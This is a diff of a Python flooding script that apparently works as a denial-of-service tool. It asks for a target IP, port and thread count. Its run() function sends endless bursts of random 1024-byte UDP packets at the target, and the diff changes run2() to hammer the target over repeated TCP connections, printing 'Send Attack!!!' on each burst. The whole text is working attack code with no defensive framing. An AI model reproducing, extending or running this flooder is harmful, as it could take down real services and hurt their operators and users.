@@ -52,29 +52,32 @@ threads =int(input("\033[96m[4] Threads :\033[91m "))
 choice =str(input("\033[96m[5] Ready? (y/n) :\033[91m "))
 
 def run():
-    data = random._urandom(1024)
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            addr = (str(ip),int(port))
-            for x in range(times):
-                s.sendto(data,addr)
-                print("\033[91m[#] Send Attack To \033[92m{}\033[91m Port \033[92m{}".format(ip,port)) 
-        except:
-            print("\033[91m[%] Send Attack To \033[92m{}\033[91m Port \033[92m{}".format(ip,port))
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" \033[91mSend Attack!!! \033[97m>>> \033[95m{}:{}".format(ip,port))
+		except:
+			print("\033[31m[?] Connection Time Out")
 
 def run2():
-    data = random._urandom(666)
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            addr = (str(ip),int(port))
-            for x in range(times):
-                s.sendto(data,addr)
-                print("\033[91m[$] Send Attack To \033[92m{}\033[91m Port \033[92m{}".format(ip,port))
-        except:
-            s.close()
-            print("\033[91m[•] Send Attack To \033[92m{}\033[91m Port \033[92m{}".format(ip,port))
+	data = random._urandom(666)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" \033[91mSend Attack!!! \033[97m>>> \033[95m{}:{}".format(ip,port)) 
+		except:
+			s.close()
+			print("\033[31m[?] Connection Time Out") 
 
 for y in range(size):
 	if choice == 'y':
